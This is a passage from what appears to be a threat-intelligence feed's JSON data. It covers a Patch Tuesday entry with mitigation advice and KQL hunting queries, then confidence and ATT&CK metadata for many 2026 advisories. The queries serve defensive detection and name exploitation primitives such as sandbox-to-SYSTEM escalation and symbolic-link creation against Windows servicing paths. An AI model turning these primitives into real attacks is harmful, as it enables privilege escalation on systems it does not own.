   "Critical Office remote code execution: CVE-2026-81959 and CVE-2026-81953 in Excel, CVE-2026-81952 in Word; CVE-2026-85875 is an Important Excel information disclosure. Other notable RCE entries: CVE-2026-85877 (Windows Print Spooler), CVE-2026-83997 (Windows Message Queuing), CVE-2026-83998 (Remote Desktop Client). A VBS-related information disclosure is tracked as CVE-2026-83501.",
   "ntcompatible reports Hotpatching is now generally available for Windows Server Azure Edition VMs, reducing reboot downtime, and identifies KB5122871 and KB5122876 as immediate deployment priorities; Windows 10 receives KB5122878. Windows Server 2012 and Exchange 2016 are approaching end of support."
  ],
  "iocs": [],
  "iocNote": "No indicators published. Microsoft confirmed exploitation of both zero-days without releasing any detail on the attacks, the actors or the targets, and neither flaw was publicly disclosed before the patch. There is nothing to hunt on beyond the exploitation primitives themselves, which the queries below cover as behaviour rather than as indicators.",
  "mitigation": [
   "Deploy the September updates, and do not gate the emergency ring on the Critical rating — both exploited zero-days are rated Important, so a severity-driven ring would ship neither. CVE-2026-85880 and CVE-2026-81963 go first.",
   "Scope the work from your own Security Update Guide export rather than a published total. Counts between outlets differ by up to 30 CVEs depending on whether earlier-in-month cloud fixes and 25 republished non-Microsoft CVEs are included.",
   "Patch Office separately. Completing Windows updates is not evidence that productivity applications are patched, and Critical Office RCE ships this month in Excel and Word.",
   "Prioritise the ZDI-flagged server-side set on internet-facing and high-value hosts — Exchange CVE-2026-55007, SharePoint CVE-2026-69465, Remote Desktop Services CVE-2026-69525, SQL Server CVE-2026-65669 — since the 20 wormable flaws are the strategic risk even though none are known exploited today.",
   "No workaround replaces the updates for the two exploited flaws; patching is the only reliable fix.",
   "Where reboot windows are the constraint on server patching, Hotpatching is now generally available for Windows Server Azure Edition VMs.",
   "Record end-of-support exposure for Windows Server 2012 and Exchange 2016 while the estate is being inventoried for this release."
  ],
  "response": [
   "DEFENDER XDR KQL — with no indicators published, hunt the two exploitation primitives as behaviour: a sandboxed low-privilege process reaching SYSTEM, and symbolic-link or junction creation against the paths the Update Stack writes. Technique adapted from community work: github.com/SlimKQL/Hunting-Queries-Detection-Rules (Steven Lim, LinkedIn @0x534c).\n\n// CVE-2026-85880 (ALPC) and CVE-2026-81963 (Update Stack) — exploitation primitives\nlet since = ago(30d);\nlet sandboxed = dynamic([\"msedge.exe\",\"chrome.exe\",\"RuntimeBroker.exe\",\"ApplicationFrameHost.exe\",\"WWAHost.exe\",\"AppXSvc\"]);\nunion isfuzzy=true\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where InitiatingProcessFileName has_any (sandboxed)\n   | where ProcessIntegrityLevel in~ (\"System\",\"High\")\n   | where InitiatingProcessIntegrityLevel in~ (\"Low\",\"AppContainer\",\"Untrusted\")\n   | project Timestamp, DeviceName, Leg = \"sandbox escape to elevated token\", Evidence = strcat(InitiatingProcessFileName, \" -> \", FileName, \" \", ProcessCommandLine)),\n  (DeviceProcessEvents\n   | where Timestamp > since\n   | where ProcessCommandLine has_any (\"mklink\",\"New-Item -ItemType SymbolicLink\",\"New-Item -ItemType Junction\",\"CreateSymbolicLink\")\n   | where ProcessCommandLine has_any (@\"\\SoftwareDistribution\", @\"\\WinSxS\", @\"\\Windows\\Temp\", @\"\\servicing\", @\"\\Panther\")\n   | project Timestamp, DeviceName, Leg = \"link created against update-stack path\", Evidence = ProcessCommandLine),\n  (DeviceFileEvents\n   | where Timestamp > since\n   | where ActionType == \"FileCreated\"\n   | where FolderPath has_any (@\"\\SoftwareDistribution\\Download\", @\"\\Windows\\servicing\")\n   | where InitiatingProcessIntegrityLevel in~ (\"Low\",\"Medium\",\"AppContainer\")\n   | project Timestamp, DeviceName, Leg = \"unprivileged write into servicing path\", Evidence = strcat(InitiatingProcessFileName, \" wrote \", FolderPath, FileName)),\n  (DeviceEvents\n   | where Timestamp > since\n   | where ActionType in (\"ProcessPrimaryTokenModified\",\"ProcessCreatedUsingWmi\",\"OpenProcessApiCall\")\n   | where InitiatingProcessIntegrityLevel in~ (\"Low\",\"AppContainer\")\n   | project Timestamp, DeviceName, Leg = \"token manipulation from low-integrity process\", Evidence = strcat(ActionType, \": \", InitiatingProcessFileName))\n| summarize Hits = count(), First = min(Timestamp), Last = max(Timestamp), Detail = make_set(Evidence, 8) by DeviceName, Leg\n| sort by Last desc",
   "DEFENDER XDR KQL — the second query for a release this size is coverage, not detection: which hosts still carry the two exploited CVEs and the ZDI-flagged server-side set, and which have not rebooted into the update.\n\n// September 2026 Patch Tuesday — exposure to the flaws that matter\nlet priority = dynamic([\"CVE-2026-85880\",\"CVE-2026-81963\",\"CVE-2026-55007\",\"CVE-2026-69465\",\"CVE-2026-69525\",\"CVE-2026-65669\",\"CVE-2026-80097\"]);\nunion isfuzzy=true\n  (DeviceTvmSoftwareVulnerabilities\n   | where CveId in~ (priority)\n   | summarize Devices = dcount(DeviceId), Hosts = make_set(DeviceName, 20)\n       by CveId, SoftwareName, RecommendedSecurityUpdate\n   | extend Leg = iff(CveId in~ (\"CVE-2026-85880\",\"CVE-2026-81963\"), \"exploited zero-day\", \"ZDI priority\")),\n  (DeviceInfo\n   | where Timestamp > ago(1d)\n   | summarize arg_max(Timestamp, OSVersion, OSBuild) by DeviceName\n   | extend Leg = \"current build\", CveId = \"-\", SoftwareName = OSVersion, RecommendedSecurityUpdate = tostring(OSBuild), Devices = 1, Hosts = pack_array(DeviceName)\n   | project CveId, SoftwareName, RecommendedSecurityUpdate, Devices, Hosts, Leg)\n| sort by Leg asc, Devices desc",
   "SENTINEL KQL — track the deployment itself, because the failure mode on a release this large is an update that installed and never rebooted.\n\n// September 2026 update deployment and pending-reboot state\nlet since = ago(14d);\nlet kbs = dynamic([\"5122871\",\"5122876\",\"5122878\"]);\nunion isfuzzy=true\n  (Event\n   | where TimeGenerated > since\n   | where Source == \"Microsoft-Windows-WindowsUpdateClient\"\n   | where RenderedDescription has_any (kbs) or RenderedDescription has \"Security Update\"\n   | extend Outcome = iff(RenderedDescription has_any (\"failure\",\"failed\",\"error\"), \"failed\", \"installed\")\n   | project TimeGenerated, Host = Computer, Leg = strcat(\"update \", Outcome), Evidence = RenderedDescription),\n  (Event\n   | where TimeGenerated > since\n   | where EventID == 1074 or RenderedDescription has \"restart\"\n   | project TimeGenerated, Host = Computer, Leg = \"restart recorded\", Evidence = RenderedDescription)\n| summarize Events = count(), First = min(TimeGenerated), Last = max(TimeGenerated), Detail = make_set(Evidence, 4) by Host, Leg\n| sort by Host asc",
   "Neither zero-day is an initial-access vector, so a hit on the behavioural query is a signal that something else already succeeded. Treat it as an intrusion investigation on that host rather than as a patch failure, and look for the preceding delivery — browser or Office child processes, and any AppContainer-hosted application in the same window.",
   "Re-run the exposure query after the deployment window and record the residual count. On a release this size the useful artefact is the exception list, not the completion percentage."
  ],
  "source": "Microsoft Security Update Guide, BleepingComputer, SecurityWeek (citing ZDI's Dustin Childs and Tenable's Satnam Narang), CybersecurityNews, Cryptika, securityonline.info, Action1, ntcompatible, Help Net Security, Windows Report",
  "sourceNote": "Sep 8, 2026"
 }
},
  META: {
 "ncentral86218": {
  "status": "ongoing",
  "conf": "Vendor and incident-response confirmation — N-able advisory plus Huntress rapid response from a live customer compromise; vendor states in-the-wild exploitation, release notes contradict",
  "confNote": "High confidence on the vulnerability, the patch and the tradecraft. Exploitation attribution is unresolved: N-able's MSPGeek post and Active Incident page say CVE-2026-86218 has been observed exploited while the HF4 release notes say there are no confirmations in production, and Huntress cannot say which of three flaws was used in the compromise it investigated because appliance logs had rotated. August IOC IPs are commercial VPN exit nodes, so low fidelity for blocking",
  "iocDate": "Aug 1 – Aug 6, 2026 — N-able IP sets; Sep 5, 2026 — Huntress September indicators; Sep 6, 2026 — HF4 and CVE-2026-86218",
  "admiralty": "A1",
  "severity": 5,
  "cvss": 10,
  "sectors": [
   "All Sectors",
   "Information Technology",
   "Commercial Facilities",
   "Government Facilities"
  ],
  "attack": [
   "T1190 — Exploit Public-Facing Application",
   "T1078.001 — Valid Accounts: Default Accounts",
   "T1136.001 — Create Account: Local Account",
   "T1219 — Remote Access Software",
   "T1572 — Protocol Tunneling",
   "T1072 — Software Deployment Tools",
   "T1036.005 — Masquerading: Match Legitimate Name or Location"
  ]
 },
 "falconflank": {
  "status": "updated",
  "conf": "Researcher claims with public proofs of concept — one vendor (Gen) confirms and has fixed, CrowdStrike still investigating, Nvidia silent; independent researcher confirms the code works",
  "confNote": "Updated Sep 7: GenDigital confirmed a privilege-escalation vulnerability affecting a subset of Gen products including Avast Antivirus and says it has fixed the issue, and Kevin Beaumont states the Avast, CrowdStrike and Kaspersky exploits work — the first third-party confirmation. CrowdStrike is still investigating FalconFlank, with no CVE, CVSS or fix, and sources still disagree on affected Windows builds. Nvidia had made no statement on GreenSection at publication. Local access remains the prerequisite for all three and no exploitation in the wild has been reported.",
  "iocDate": "Sep 3–7, 2026 — PoCs published; no campaign indicators",
  "admiralty": "B2",
  "severity": 3,
  "cvss": 0,
  "sectors": [
   "All Sectors",
   "Information Technology"
  ],
  "attack": [
   "T1068 — Exploitation for Privilege Escalation",
   "T1574.001 — Hijack Execution Flow: DLL",
   "T1211 — Exploitation for Defense Evasion",
   "T1548 — Abuse Elevation Control Mechanism"
  ]
 },
 "postgreshell": {
  "status": "ongoing",
  "conf": "Vendor research with upstream confirmation — Cyera Research Labs disclosure reviewed and fixed by the PostgreSQL security team; no exploitation reported",
  "confNote": "Coordinated disclosure, no in-the-wild exploitation reported and not in CISA KEV. Impact chain (RCE, superuser, persistent backdoor) is the researchers' demonstration rather than observed attacker behaviour. The 114 malicious plugin samples Cyera found on VirusTotal are not linked to this CVE. CVSS 7.2 understates the outcome where REPLICATION credentials are widely shared",
  "iocDate": "Aug 13, 2026 — patched releases; Sep 1, 2026 — Cyera disclosure",
  "admiralty": "A2",
  "severity": 3,
  "cvss": 7.2,
  "sectors": [
   "All Sectors",
   "Information Technology",
   "Financial Services"
  ],
  "attack": [
   "T1078 — Valid Accounts",
   "T1574.002 — Hijack Execution Flow: DLL Side-Loading",
   "T1068 — Exploitation for Privilege Escalation",
   "T1505 — Server Software Component"
  ]
 },
 "linuxkernelpoc": {
  "status": "ongoing",
  "conf": "Published research with working exploit code — NebuSec proof of concept for both CVEs, verified against named distributions; no exploitation reported",
  "confNote": "No in-the-wild exploitation and neither CVE is in KEV as of Sep 6, 2026. Both require local access. CVSS 9.8 as carried in the reporting is inconsistent with a local-only attack vector, and upstream initially triaged CVE-2026-52924 as denial of service — treat the score with caution and the demonstrated local-root impact as the planning basis",
  "iocDate": "Sep 3, 2026 — CVE-2026-80714 PoC; Sep 5, 2026 — CVE-2026-52924 PoC",
  "admiralty": "B2",
  "severity": 3,
  "cvss": 9.8,
  "sectors": [
   "All Sectors",
   "Information Technology"
  ],
  "attack": [
   "T1068 — Exploitation for Privilege Escalation",
   "T1547.006 — Kernel Modules and Extensions",
   "T1499 — Endpoint Denial of Service"
  ]
 },
 "chromev8": {
  "status": "ongoing",
  "conf": "Vendor confirmation — Google states an exploit exists in the wild and shipped the fix; CISA KEV listing Sep 4, 2026. No exploitation detail, targeting or indicators published",
  "confNote": "Google withholds bug detail and links until the majority of users are updated, so no campaign, victim or indicator information is available and none should be expected soon. No CVSS score published in the sources reviewed; Google rates the flaw high severity. Whether a sandbox escape was chained is not stated",
  "iocDate": "Sep 3, 2026 — patched; Sep 4, 2026 — added to CISA KEV; Sep 6, 2026 — still no published indicators",
  "admiralty": "A1",
  "severity": 4,
  "cvss": null,
  "sectors": [
   "All Sectors",
   "Information Technology"
  ],
  "attack": [
   "T1189 — Drive-by Compromise",
   "T1203 — Exploitation for Client Execution"
  ]
 },
 "superforms": {
  "status": "ongoing",
  "conf": "Vendor telemetry — Wordfence firewall data showing more than 440,000 blocked attempts across both CVEs, with named researcher attribution and vendor patches for each",
  "confNote": "Exploitation volume, timeline and source addresses come from a single vendor's firewall telemetry (Wordfence), which reflects its own customer base rather than global activity. CVSS for CVE-2026-32475 is reported as 9.0 by some sources and 9.8 by others; the Super Forms flaw is consistently 9.8. Neither CVE is in CISA KEV as of Sep 5, 2026",
  "iocDate": "Jul 8, 2026 — Super Forms 6.3.314; Jul 14 and Aug 19, 2026 — exploitation begins; Sep 4, 2026 — Wordfence volume reporting",
  "admiralty": "A2",
  "severity": 4,
  "cvss": 9.8,
  "sectors": [
   "Commercial Facilities",
   "Information Technology",
   "All Sectors"
  ],
  "attack": [
   "T1190 — Exploit Public-Facing Application",
   "T1505.003 — Server Software Component: Web Shell",
   "T1136.001 — Create Account: Local Account",
   "T1059 — Command and Scripting Interpreter"
  ]
 },
 "nodeabuse": {
  "status": "ongoing",
  "conf": "Vendor research — Symantec Threat Hunter Team incident reporting across multiple named intrusions, with corroborating detail from its own June 2026 Woodgnat publication and Zscaler ThreatLabz on C2Looper",
  "confNote": "Single-vendor incident reporting; victims are described by sector and region rather than named. No hashes, addresses or domain lists published in the reporting reviewed, and the EtherHiding channel uses legitimate blockchain gateways. Woodgnat's ransomware associations are described as public linkage, not as attribution of a specific encryption event",
  "iocDate": "Feb 2026 — technique resurgence; May 6, 2026 — earliest US fintech activity; Sep 3, 2026 — Symantec report",
  "admiralty": "A2",
  "severity": 4,
  "cvss": null,
  "sectors": [
   "Government Facilities",
   "Information Technology",
   "Commercial Facilities",
   "Financial Services"
  ],
  "attack": [
   "T1204.004 — User Execution: Malicious Copy and Paste",
   "T1059.007 — Command and Scripting Interpreter: JavaScript",
   "T1105 — Ingress Tool Transfer",
   "T1218 — System Binary Proxy Execution",
   "T1547.001 — Registry Run Keys / Startup Folder",
   "T1102 — Web Service",
   "T1543.003 — Create or Modify System Process: Windows Service"
  ]
 },
 "magleak": {
  "status": "ongoing",
  "conf": "Confirmed incident — MAG disclosure and BBC confirmation of the refused ransom; publication of the dataset corroborated by SecurityWeek, BleepingComputer, Computer Weekly and Have I Been Pwned. Access path and data contents beyond MAG's disclosure are actor claims",
  "confNote": "Volume figures disagree across sources (86 GB compressed, ~550 GB, ~640 GB extracted, 74.5 GB in four archives). The Iterable-API-keys-in-frontend-JavaScript access path is FulcrumSec's account to BleepingComputer and is unconfirmed by MAG. Whether the ~200,000 upcoming-travel records were withheld is not established",
  "iocDate": "Aug 25, 2026 — access discovered; Aug 27 — MAG disclosure; Sep 2, 2026 — data published",
  "admiralty": "B2",
  "severity": 4,
  "cvss": null,
  "sectors": [
   "Transportation Systems",
   "Commercial Facilities"
  ],
  "attack": [
   "T1552.001 — Unsecured Credentials: Credentials In Files",
   "T1078.004 — Valid Accounts: Cloud Accounts",
   "T1567.002 — Exfiltration Over Web Service",
   "T1657 — Financial Theft"
  ]
 },
 "wpmigration": {
  "status": "ongoing",
  "conf": "Vendor and researcher disclosure — Wordfence full technical write-up with vendor patch; exploitation reported by SOCRadar but without independent confirmation in its sources",
  "confNote": "Sources disagree on exploit availability: SOCRadar records one public PoC repository with a weaponised variant as of Sep 3, while SentinelOne's entry states no public PoC is listed. Not in CISA KEV as of Sep 4, 2026. The advisory describes unauthenticated attackers while the CVSS vector indicates PR:L — the discrepancy is in the source",
  "iocDate": "Aug 20, 2026 — 7.110 released; Sep 2, 2026 — Wordfence disclosure",
  "admiralty": "A2",
  "severity": 4,
  "cvss": 8.8,
  "sectors": [
   "Commercial Facilities",
   "Information Technology",
   "All Sectors"
  ],
  "attack": [
   "T1190 — Exploit Public-Facing Application",
   "T1505.003 — Server Software Component: Web Shell",
   "T1552 — Unsecured Credentials",
   "T1059 — Command and Scripting Interpreter"
  ]
 },
 "brazetsu": {
  "status": "ongoing",
  "conf": "Vendor research — Group-IB technical report with high-confidence internal attribution linking BraZetsu and AgenteV2; no independent corroboration of the attribution reviewed",
  "confNote": "Single-source research. No hashes, addresses or domains published in the reporting reviewed, and Group-IB states some samples were fully undetected on VirusTotal at analysis time. Regional focus is Brazil and Iberia; US access advertisements are reported but not quantified",
  "iocDate": "Early May 2026 — first seen; Sep 1, 2026 — Group-IB report",
  "admiralty": "B2",
  "severity": 3,
  "cvss": null,
  "sectors": [
   "Financial Services",
   "Critical Manufacturing",
   "Government Facilities",
   "Information Technology"
  ],
  "attack": [
   "T1059.005 — Command and Scripting Interpreter: Visual Basic",
   "T1547.001 — Registry Run Keys / Startup Folder",
   "T1053.005 — Scheduled Task",
   "T1217 — Browser Information Discovery",
   "T1552.004 — Private Keys",
   "T1113 — Screen Capture",
   "T1082 — System Information Discovery",
   "T1071.001 — Application Layer Protocol: Web Protocols"
  ]
 },
 "iranot": {
  "status": "ongoing",
  "cvss": null,
  "admiralty": "B2",
  "conf": "Confirmed impact, attribution reported not formally attributed — UK officials speaking to press; FBI attributed US incidents to malicious cyber actors with government sources naming Iran as the likely origin",
  "confNote": "The UK plant is unnamed and the attribution comes from officials speaking to news outlets rather than from a published advisory. Scope reporting differs by date: at least seven states (Foreign Policy, Aug 13) versus twelve states in the later coverage. The intent assessment — capability demonstration rather than direct harm — is from researchers quoted in the reporting, not from government.",
  "iocDate": "Aug 29, 2026 — no indicators published",
  "severity": 5,
  "sectors": [
   "Energy",
   "Water and Wastewater Systems",
   "Government Facilities",
   "Critical Manufacturing"
  ],
  "attack": [
   "T0812 — Change Credential (ICS)",
   "T0813 — Denial of Control (ICS)",
   "T0827 — Loss of Control (ICS)",
   "T0800 — Activate Firmware Update Mode (ICS)",
   "T0855 — Unauthorized Command Message (ICS)",
   "T1190 — Exploit Public-Facing Application"
  ]
 },
 "novacookies": {
  "status": "ongoing",
  "cvss": null,
  "admiralty": "A2",
  "conf": "Vendor research — infrastructure and targeting confirmed; compromise not asserted",
  "confNote": "Island states its campaign artifacts indicate targeting and infrastructure association, not successful delivery or account compromise, and that geographic and sector findings describe the reviewed dataset rather than a complete victim census. Telegram pricing material records claims by an account advertising the service and does not establish identity, customer, order or payment. Island and Proofpoint report different activity curves, which Island attributes to different research vantage points. Short-lived links prevented repeatable testing of every access condition.",
  "iocDate": "Aug 26, 2026",
  "sectors": [
   "All Sectors",
   "Financial Services",
   "Information Technology",
   "Government Facilities",
   "Critical Manufacturing",
   "Commercial Facilities"
  ],
  "attack": [
   "T1566.002 Phishing: Spearphishing Link",
   "T1656 Impersonation",
   "T1557 Adversary-in-the-Middle",
   "T1539 Steal Web Session Cookie",
   "T1550.004 Use Alternate Authentication Material: Web Session Cookie",
   "T1621 Multi-Factor Authentication Request Generation",
   "T1584 Compromise Infrastructure",
   "T1497 Virtualization/Sandbox Evasion",
   "T1583.001 Acquire Infrastructure: Domains",
   "T1098.005 Account Manipulation: Device Registration"
  ],
  "severity": 3
 },
 "papercut": {
  "status": "ongoing",
  "cvss": 9.4,
  "admiralty": "A1",
  "conf": "Confirmed exploitation — vendor-confirmed customer incidents plus independent IR observation",
  "confNote": "PaperCut confirms customer incidents but has published no detail on the activity or the actor. Huntress observed exploitation in two customer environments; watchTowr reports the chaining and the patch bypasses. The bypass claims are watchTowr's own and have not been independently confirmed. · KEV listing Aug 31, 2026 (BOD 26-04, forensic triage required); SecurityWeek reports escalation to active intrusions Sep 1, 2026 · Sep 2: vendor-extended IOC list and reported installation of SimpleHelp and AnyDesk remote access tooling; federal deadline Sep 14, 2026 · Sep 6: Arctic Wolf reports an education-sector campaign (US and European K-12 through universities) with published network and host indicators, privileged account creation and credential harvesting, and SOC Prime records a public PoC for the full chain",
  "iocDate": "Aug 30, 2026 — extended vendor indicator list; Sep 5, 2026 — Arctic Wolf campaign indicators",
  "sectors": [
   "All Sectors",
   "Information Technology",
   "Government Facilities",
   "Commercial Facilities",
   "Healthcare and Public Health"
  ],
  "attack": [
   "T1190 Exploit Public-Facing Application",
   "T1059 Command and Scripting Interpreter",
   "T1505 Server Software Component",
   "T1082 System Information Discovery",
   "T1057 Process Discovery",
   "T1070.004 Indicator Removal: File Deletion",
   "T1070.002 Indicator Removal: Clear Linux or Mac System Logs"
  ],
  "severity": 5
 },
 "zbtimplants": {
  "status": "ongoing",
  "cvss": 9.3,
  "admiralty": "A1",
  "conf": "Vendor research — implants confirmed present in firmware; exploitation status disputed between catalogs",
  "confNote": "VulnCheck lists CVE-2026-74233 in its own KEV catalog on in-the-wild criteria, while CISA's Vulnrichment rates exploitation as proof-of-concept as of Aug 27 and none of the three ZBT CVEs are in CISA KEV as of catalog version 2026.08.27. The 392 beaconing devices are a floor from an unrepresentative subset, and 203 is a probe-response count, not a compromise count.",
  "iocDate": "Aug 28, 2026",
  "sectors": [
   "Communications",
   "Information Technology",
   "Commercial Facilities",
   "All Sectors"
  ],
  "attack": [
   "T1200 Hardware Additions",
   "T1195.003 Supply Chain Compromise: Compromise Hardware Supply Chain",
   "T1059 Command and Scripting Interpreter",
   "T1071 Application Layer Protocol",
   "T1572 Protocol Tunneling",
   "T1557 Adversary-in-the-Middle",
   "T1584.008 Compromise Infrastructure: Network Devices",
   "T1552 Unsecured Credentials"
  ],
  "severity": 4
 },
 "shieldbreak": {
  "status": "ongoing",
  "conf": "Confirmed vulnerability — Microsoft confirmed CVE-2026-69414 and is developing a patch; PoC public; CISA BOD 26-04 requires FCEB agencies to deploy compensating controls within 14 days; no confirmed in-wild exploitation in CISA KEV",
  "confNote": "Microsoft assigned CVE-2026-69414 Aug 14; PoC public Aug 12 (Nightmare Eclipse); Kevin Beaumont KQL detection published; CISA BOD 26-04 applies — 14-day compensating control requirement for federal agencies; no in-wild exploitation confirmed in CISA KEV catalog as of Aug 21",
  "iocDate": "n/a — local exploit, no network indicators",
  "admiralty": "A2",
  "severity": 5,
  "cvss": null,
  "sectors": [
   "All Sectors"
  ],
  "attack": [
   "T1068 — Exploitation for Privilege Escalation",
   "T1543 — Create or Modify System Process"
  ]
 },
 "astracyber": {
  "status": "ongoing",
  "conf": "Vendor self-assessment — OpenAI's own framework and declaration; no independent evaluation published. The linked exploitation case (CVE-2026-66384, Hugging Face) is separately documented and KEV-listed",
  "confNote": "Carried as a planning input on exploitation speed, not as threat activity. No indicators, no hunting content",
  "iocDate": "Sep 1–2, 2026 — reported",
  "admiralty": "B2",
  "severity": 3,
  "cvss": null,
  "sectors": [
   "Information Technology"
  ],
  "attack": [
   "T1588.006 — Obtain Capabilities: Vulnerabilities",
   "T1587.004 — Develop Capabilities: Exploits"
  ]
 },
 "watchguardiked": {
  "status": "ongoing",
  "conf": "Confirmed vulnerabilities, no reported exploitation — vendor patches released; CVE identifiers and version ranges not stated in the reporting reviewed",
  "confNote": "Secondary source (SecurityWeek) for the component and impact. Consult WatchGuard's advisory for CVE IDs, CVSS and affected versions before scoping",
  "iocDate": "Sep 1, 2026 — patches reported",
  "admiralty": "B2",
  "severity": 4,
  "cvss": null,
  "sectors": [
   "Information Technology",
   "All Sectors"
  ],
  "attack": [
   "T1190 — Exploit Public-Facing Application",
   "T1133 — External Remote Services"
  ]
 },
 "virtualizor": {
  "status": "ongoing",
  "conf": "Confirmed by vendor — Softaculous confirms the BGP hijack, the fraudulently obtained certificate and delivery of a malicious update package; the affected server population cannot be enumerated",
  "confNote": "Primary source is the vendor's own incident notice. Victim count described only as a handful of servers; malicious traffic never reached vendor logs. One IOC published by the vendor and not reproduced here",
  "iocDate": "Aug 28–30, 2026 — hijack window; vendor notice Sep 2, 2026",
  "admiralty": "A2",
  "severity": 5,
  "cvss": null,
  "sectors": [
   "Information Technology",
   "Communications"
  ],
  "attack": [
   "T1195.002 — Compromise Software Supply Chain",
   "T1557 — Adversary-in-the-Middle",
   "T1553.004 — Install Root Certificate",
   "T1584 — Compromise Infrastructure"
  ]
 },
 "jfrog82329": {
  "status": "ongoing",
  "conf": "Reported exploitation — watchTowr honeypot observation of admin-token minting; JFrog has not confirmed exploitation and no other reports exist",
  "confNote": "Single-source exploitation evidence (watchTowr Attacker Eye). Vendor confirms the flaw and has patched it; CTO characterises it as improper authentication, not RCE, and self-hosted only. No KEV listing as of Sep 2, 2026; no published CVSS in the sources reviewed · Added to CISA KEV Sep 2, 2026 with CVSS 9.8 and a federal deadline of Sep 5 · Sep 4: watchTowr post-exploitation detail adds enumeration of users, groups, credentials and federated access relationships, and backdoor user creation in a limited number of attacks",
  "iocDate": "Aug 28, 2026 — patch released; Sep 1, 2026 — exploitation reported",
  "admiralty": "B2",
  "severity": 5,
  "cvss": 9.8,
  "sectors": [
   "Information Technology"
  ],
  "attack": [
   "T1190 — Exploit Public-Facing Application",
   "T1078 — Valid Accounts",
   "T1550.001 — Application Access Token",
   "T1195.002 — Compromise Software Supply Chain",
   "T1087 — Account Discovery"
  ]
 },
 "langflow": {
  "status": "ongoing",
  "conf": "Confirmed exploitation — VulnCheck reports observed in-the-wild exploitation with 360+ attempts against its UK canaries; activity characterised as reconnaissance and credential harvesting",
  "confNote": "Single vendor source for the exploitation observation. No indicator values published; no KEV listing for CVE-2026-0768 as of Sep 2, 2026",
  "iocDate": "Sep 1, 2026 — VulnCheck report; canary volume measured to Aug 31, 2026",
  "admiralty": "A2",
  "severity": 5,
  "cvss": 9.8,
  "sectors": [
   "Information Technology"
  ],
  "attack": [
   "T1190 — Exploit Public-Facing Application",
   "T1552 — Unsecured Credentials",
   "T1552.001 — Credentials In Files",
   "T1082 — System Information Discovery"
  ]
 },
 "sonicwallsma": {
  "status": "ongoing",
  "conf": "Confirmed exploitation — vendor states it observed exploitation of both vulnerabilities, which it discovered internally while investigating attacks",
  "confNote": "Single-source for the attack detail (SonicWall PSIRT, reported by SecurityWeek). No victim count, actor attribution, IOCs or KEV listing as of Sep 2, 2026 · Both CVEs added to CISA KEV Sep 2, 2026 (BOD 26-04, federal deadline Sep 5) · Rapid7 confirms no public PoC, IOCs or attribution identified as of Sep 2",
  "iocDate": "Sep 1, 2026 — advisory published; exploitation timeline not disclosed",
  "admiralty": "A2",
  "severity": 5,
  "cvss": 10,
  "sectors": [
   "Information Technology",
   "All Sectors"
  ],
  "attack": [
   "T1190 — Exploit Public-Facing Application",
   "T1133 — External Remote Services",
   "T1059 — Command and Scripting Interpreter",
   "T1556 — Modify Authentication Process"
  ]
 },
 "kevsep02": {
  "status": "ongoing",
  "conf": "Authoritative — CISA KEV catalog addition; each entry requires evidence of active exploitation",
  "confNote": "Seven additions dated Sep 2, 2026 under BOD 26-04. Deadlines Sep 5 for five entries, Sep 16 for CVE-2026-48710 and CVE-2026-59822. The Kestra listing rests on a Microsoft report of likely exploitation in late June 2026",
  "iocDate": "Sep 2, 2026 — KEV catalog addition",
  "admiralty": "A1",
  "severity": 5,
  "cvss": 10,
  "sectors": [
   "All Sectors",
   "Information Technology",
   "Government Facilities",
   "Communications"
  ],
  "attack": [
   "T1190 Exploit Public-Facing Application",
   "T1059 Command and Scripting Interpreter",
   "T1078 Valid Accounts",
   "T1496 Resource Hijacking"
  ]
 },
 "switchvox": {
  "status": "ongoing",
  "conf": "Confirmed exploitation — Horizon3.ai and Defused Cyber honeypot capture of valid exploitation attempts, with published indicators",
  "confNote": "Exploitation first observed Aug 30, 2026 from a single source IP; patched Jul 14, 2026 in 8.4.0.2. Second-stage malware deployment reported by Help Net Security as possibly a cryptominer and not confirmed. Added to CISA KEV Sep 2 with a Sep 5 federal deadline",
  "iocDate": "Aug 30, 2026 — first observed exploitation; indicators published Sep 1, 2026",
  "admiralty": "A1",
  "severity": 5,
  "cvss": 9.3,
  "sectors": [
   "Communications",
   "Information Technology",
   "Commercial Facilities"
  ],
  "attack": [
   "T1190 Exploit Public-Facing Application",
   "T1505 Server Software Component",
   "T1059 Command and Scripting Interpreter",
   "T1057 Process Discovery",
   "T1552 Unsecured Credentials"
  ]
 },
 "aiinfra": {
  "status": "ongoing",
  "conf": "Confirmed exploitation — two independent vendor telemetry sets (Wiz honeypots, Microsoft incident analysis) with published indicators",
  "confNote": "Wiz covers 90 days to Aug 27, 2026. The blind prompt-injection payload is a reconstruction consistent with the observed process tree, stated as such by Wiz, not a captured prompt. The Qilin attribution for the LiteLLM chain is Wiz relaying external researchers, not first-hand attribution",
  "iocDate": "Aug 26–27, 2026 — Wiz and Microsoft publications",
  "admiralty": "A2",
  "severity": 5,
  "cvss": 8.7,
  "sectors": [
   "Information Technology",
   "All Sectors"
  ],
  "attack": [
   "T1190 Exploit Public-Facing Application",
   "T1059.006 Command and Scripting Interpreter: Python",
   "T1552.001 Unsecured Credentials: Credentials In Files",
   "T1555 Credentials from Password Stores",
   "T1496 Resource Hijacking",
   "T1098.004 Account Manipulation: SSH Authorized Keys",
   "T1027 Obfuscated Files or Information",
   "T1070.004 Indicator Removal: File Deletion"
  ]
 },
 "rockwellsep": {
  "status": "ongoing",
  "conf": "Vendor advisory — patches and workarounds published; CISA states it is not aware of exploitation of CVE-2026-9637",
  "confNote": "Scheduled remediation item. No exploitation reported, no indicators published",
  "iocDate": "n/a — no exploitation reported",
  "admiralty": "A2",
  "severity": 3,
  "cvss": null,
  "sectors": [
   "Critical Manufacturing",
   "Energy",
   "Water and Wastewater Systems"
  ],
  "attack": [
   "T0812 Default Credentials",
   "T1190 Exploit Public-Facing Application",
   "T1499 Endpoint Denial of Service"
  ]
 },
 "ukcsrb": {
  "status": "ongoing",
  "conf": "Reported — SecurityWeek reporting on tabled amendments; the bill is in the House of Lords and the amendments are not law",
  "confNote": "Amendments tabled Aug 24, 2026 and reported Sep 2. Legislative outcome undetermined",
  "iocDate": "n/a — policy item",
  "admiralty": "B2",
  "severity": 2,
  "cvss": null,
  "sectors": [
   "All Sectors",
   "Energy",
   "Water and Wastewater Systems"
  ],
  "attack": []
 },
 "ciscosep": {
  "status": "ongoing",
  "conf": "Vendor advisory — Cisco PSIRT publication; Cisco states the IOS XR issues were found in internal testing and are not known to be actively exploited",
